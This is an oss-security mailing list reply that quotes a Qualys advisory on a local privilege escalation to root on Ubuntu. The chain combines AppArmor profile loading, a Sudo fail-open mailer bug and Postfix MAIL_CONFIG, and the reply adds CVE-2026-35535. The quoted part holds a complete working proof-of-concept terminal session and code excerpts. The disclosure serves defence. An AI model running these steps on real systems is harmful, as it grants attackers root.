Received: (qmail 3699 invoked by uid 550); 3 Apr 2026 09:04:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 1547 invoked from network); 3 Apr 2026 09:04:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1775207040; x=1775811840; darn=lists.openwall.com;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:sender:from:to:cc:subject:date:message-id
         :reply-to;
        bh=Eb5SyDofGD8mYVaBKVeHo/N/o9j1w6gEBZmGQSI9L9k=;
        b=MX/uVTUbAC2nTyjA9jWmpZW2zj8w5U7FhTPnMeSF1qGduwHOK/T8sQmU0WsYgBsueE
         6nd+AVEItiXXt7x80N/rZQ0YZoU7fMDPVhVV6Br4WaWVJ1WlK3pjRrO6W6UJ2rM4itOL
         r2ZOVZnjrylEURFiSwYQ6MM+1e3LPQftUEN/ww245ygryUI38W/Lz1MPCzybrlKdNX0r
         /pVQT1/U/pvUHhcPF9f2xqC0AKeMNvXgF4Fcbzrzg4vNnDiW/PM1Ut+2zT9FgsDjFJpR
         bmlgacP8FQJMp51nOpKFR4hkK7MVRimnchLRwtBdc/jPPZuTVs75MgxiVZZ9XWuZfrFD
         VKkA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1775207040; x=1775811840;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:sender:x-gm-gg:x-gm-message-state:from:to
         :cc:subject:date:message-id:reply-to;
        bh=Eb5SyDofGD8mYVaBKVeHo/N/o9j1w6gEBZmGQSI9L9k=;
        b=YqqaE4tDu/yB7cusNHz46uPxId+Bvd+S5juwXv5/IFlqCRdqZI2dPUDtDKZ/H29u+g
         P+ZHZWlSm617KbK9JCumtgxj/AWjpK7HkIijnBq/XPIa9sW8OaDFCcRF4IG0Pm+K0r6l
         /Ig+kVKJN9jdrGScQKNNhTXx6wNAuVAh+CZQv+QV+0iYSrQgYHI06O4BxhhLX7o8k63w
         gqPq43NLbIyMydNfgtIQODAheL2QfyL/WNcvhFa/yt0MkRPA5XlbpXpYSP5pX1WPN77o
         VbH7E4Btpv9Lkwt+lwZl0L4Ziq5qtJm2NDf5pzpMsA6h8LS/sS5Dp7b/n78GlISS+wz0
         dx5Q==
X-Gm-Message-State: AOJu0YztwF0WaSOPELMRrHFVRZvNuq3H55XUwGqQYbJlCHb26HvlAIGB
	yjK8qUw8NIyolLhjiLWSb0XpWdjizqkuPEmbZb3uPnhqlDt+cpzg27mi3U3nv04Q
X-Gm-Gg: ATEYQzyXxTo3D8kTtC1HSZ22ksj0XHsshyNn1/fmXs/NQ/3WOFlBPd50T3TVfBqK3Xs
	IubX+AZ7bVpOnmWoULcPwq/1H3TOWIM3LxokBzYVWY0JwKQP2xhPiH4gSmD3hIMlWYeqTuOMgla
	7GXy1kwGmUq9yXzLlFSz5+wo/XeMRp5YAlrYu8tvZ7JKoZl6WJPhJ/+AUoFQCdPC+KCqUZlmyW+
	sTkLUr2OWOsxMnAqJkFi6LOjZ/il1EpdssEpor/HIMA/xstcv+oOtf+54qa0Ap6mEiiVdoZUSfG
	MJ1GS9kQX4BT65XT3KeUDqgzhuJjLqtoTunFRrVCS1jQHGSVYqrQ9bSLYclK1Rd8Mrk8s9ZN6f8
	lC3lssCVDGxueTBqVjP2nSd8Fg+4URCL0hU3c5q3wv+kwcoT2Xbh3kAWAnpKY/C3hRltMLJX8t9
	neQgFOA4hx7xATmvOSpM7eJODVPp9ZgjtHConwT/ZfWL8XiHjw5DdJ8MsdxZ8=
X-Received: by 2002:a05:600c:1d1d:b0:485:3ec6:e634 with SMTP id 5b1f17b1804b1-4889977600bmr32189085e9.15.1775207039448;
        Fri, 03 Apr 2026 02:03:59 -0700 (PDT)
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Date: Fri, 3 Apr 2026 11:03:55 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
To: oss-security@lists.openwall.com
Cc: John Johansen <john.johansen@canonical.com>
Message-ID: <ac-Ce5ILVDBNlwy5@eldamar.lan>
References: <20260312212345.GA2728@localhost.localdomain>
 <20260312213345.GA3105@localhost.localdomain>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260312213345.GA3105@localhost.localdomain>
Subject: Re: [oss-security] Re: Multiple vulnerabilities in AppArmor

Hi,

On Thu, Mar 12, 2026 at 09:33:57PM +0000, Qualys Security Advisory wrote:
[...]
> AppArmor + Sudo + Postfix = root
[...]
> ========================================================================
> AppArmor + Sudo + Postfix = root
> ========================================================================
> 
>     Did you get your disconnection notice?
>     Mine came in the mail today
>         -- Sonic Youth, "Disconnection Notice"
> 
> As an unprivileged local attacker, the ability to load, replace, and
> remove arbitrary AppArmor profiles is remarkable, but our crucial and
> burning question was: can this ability be transformed into an LPE to
> full root privileges? Our key idea was to load new AppArmor profiles
> that deny certain syscalls to certain privileged programs, and
> consequently to create exploitable "fail-open" situations.
> 
> From our work on Baron Samedit, we remembered that when Sudo encounters
> an unusual situation, it sends a mail to the system's administrator. And
> to send such a mail on Ubuntu, Sudo executes /usr/sbin/sendmail as our
> unprivileged user, not as root, with our original environment variables
> preserved (excluding the obviously dangerous variables such as LD_AUDIT
> and LD_PRELOAD, which were removed from the environment by the dynamic
> loader, ld.so, before the execution of Sudo's main() function).
> 
> From CVE-2002-0043:
> 
>   https://www.sudo.ws/security/advisories/postfix/
>   (by Sebastian Krahmer)
> 
> we also remembered that if the Postfix mail server is installed on the
> system, and if Postfix's /usr/sbin/sendmail is executed as root but with
> user-controlled environment variables (in particular, the MAIL_CONFIG
> environment variable), then Postfix can be forced by the unprivileged
> user into executing arbitrary commands as root.
> 
> Our burning question therefore became: if we, as an unprivileged local
> attacker, load a new AppArmor profile that denies the setuid capability
> (CAP_SETUID) to Sudo (thereby potentially preventing Sudo from dropping
> its root privileges before it executes Postfix's /usr/sbin/sendmail),
> and if we execute Sudo with a MAIL_CONFIG environment variable that
> points to our own Postfix configuration in /tmp, is the /usr/bin/id
> command from our Postfix configuration executed as root? The answer:
> 
> ------------------------------------------------------------------------
> $ grep PRETTY_NAME= /etc/os-release
> PRETTY_NAME="Ubuntu 24.04.3 LTS"
> 
> $ id
> uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
> 
> $ dpkg -S /usr/sbin/sendmail
> postfix: /usr/sbin/sendmail
> 
> $ mkdir /tmp/postfix
> 
> $ cat > /tmp/postfix/main.cf << "EOF"
> command_directory = /tmp/postfix
> EOF
> 
> $ cat > /tmp/postfix/postdrop << "EOF"
> #!/bin/sh
> /usr/bin/id >> /tmp/postfix/pwned
> EOF
> 
> $ chmod -R 0755 /tmp/postfix
> 
> $ apparmor_parser -K -o sudo.pf << "EOF"
> /usr/bin/sudo {
>   allow file,
>   allow signal,
>   allow network,
>   allow capability,
>   deny capability setuid,
> }
> EOF
> 
> $ su -P -c 'stty raw && cat sudo.pf' "$USER" > /sys/kernel/security/apparmor/.replace
> Password: 
> 
> $ env -i MAIL_CONFIG=/tmp/postfix /usr/bin/sudo whatever
> sudo: PERM_SUDOERS: setresuid(-1, 1, -1): Operation not permitted
> sudo: unable to open /etc/sudoers: Operation not permitted
> sudo: setresuid() [0, 0, 0] -> [1001, -1, -1]: Operation not permitted
> sudo: error initializing audit plugin sudoers_audit
> 
> $ cat /tmp/postfix/pwned
> uid=0(root) gid=1001(jane) groups=1001(jane),100(users)
> ^^^^^^^^^^^
> ------------------------------------------------------------------------
> 
> The surprising sequence of events that led to this LPE as root is:
> 
> - in sudoers_init(), Sudo calls setresuid(0, -1, -1) to set its real uid
>   to 0 (PERM_ROOT), which succeeds because its effective and saved uids
>   are already 0 (Sudo is SUID-root);
> 
> - in open_sudoers() (more precisely, in open_file()), Sudo calls
>   setresuid(-1, 1, -1) to temporarily set its effective uid to 1
>   (PERM_SUDOERS), which fails (with EPERM, "Operation not permitted")
>   because none of Sudo's uids is 1 (they are all 0) and because Sudo
>   does not have the CAP_SETUID (our AppArmor profile denies it);
> 
> - back in sudoers_init(), Sudo calls mail_parse_errors() to send a mail
>   to the administrator about this setresuid() failure ("problem parsing
>   sudoers", "unable to open /etc/sudoers: Operation not permitted");
> 
> - then, in exec_mailer(), Sudo calls setuid(0) (at line 331 below) to
>   set all of its uids to 0, which succeeds because they are already 0;
> 
> - still in exec_mailer(), Sudo calls setuid(1001) (at line 336) to
>   permanently set all of its uids to our unprivileged user's uid, which
>   fails (with EPERM, "Operation not permitted") because none of Sudo's
>   uids is 1001 (they are all 0) and because Sudo does not have the
>   CAP_SETUID (our AppArmor profile denies it);
> 
> - finally, and despite this setuid() failure, Sudo's exec_mailer() calls
>   execv() (at line 345) to execute Postfix's /usr/sbin/sendmail with our
>   original environment variables (including our MAIL_CONFIG), as root
>   instead of our unprivileged user (because the setuid(1001) to drop
>   Sudo's root privileges failed).
> 
> ------------------------------------------------------------------------
>  284 exec_mailer(int pipein)
>  ...
>  327     /*
>  328      * Depending on the config, either run the mailer as root
>  329      * (so user cannot kill it) or as the user (for the paranoid).
>  330      */
>  331     if (setuid(ROOT_UID) != 0) {
>  332         sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid to %u",
>  333             ROOT_UID);
>  334     }
>  335     if (evl_conf->mailuid != ROOT_UID) {
>  336         if (setuid(evl_conf->mailuid) != 0) {
>  337             sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid to %u",
>  338                 (unsigned int)evl_conf->mailuid);
>  339         }
>  340     }
>  ...
>  342     if (evl_conf->mailuid == ROOT_UID)
>  343         execve(mpath, argv, (char **)root_envp);
>  344     else
>  345         execv(mpath, argv);
> ------------------------------------------------------------------------
> 
> Note: without the ability to load an AppArmor profile that denies the
> CAP_SETUID to Sudo, this "fail-open" situation in Sudo would not be
> exploitable, for the reasons explained in the "execve() and EAGAIN"
> section of "man execve".
> 
> Last-minute note: while writing a mail to Sudo's maintainer about this
> "fail-open" situation, we noticed that it was independently discovered,
> reported, and fixed in November 2025 (commit 3e474c2):
> 
> ------------------------------------------------------------------------
> exec_mailer: Set group as well as uid when running the mailer
> Also make a setuid(), setgid() or setgroups() failure fatal.
> Found by the ZeroPath AI Security Engineer <https://zeropath.com>
> ------------------------------------------------------------------------
> 
> Slightly disappointed by this user-space LPE (because Postfix is not
> installed by default on Ubuntu anymore), we decided to explore one more
> idea: maybe AppArmor's kernel code contains vulnerabilities that can be
> exploited in kernel space by loading, replacing, or removing arbitrary
> AppArmor profiles?

To close the circle here: sudo has a own CVE for the issue addressed
above, it is CVE-2026-35535.

https://www.cve.org/CVERecord?id=CVE-2026-35535

Regards,
Salvatore
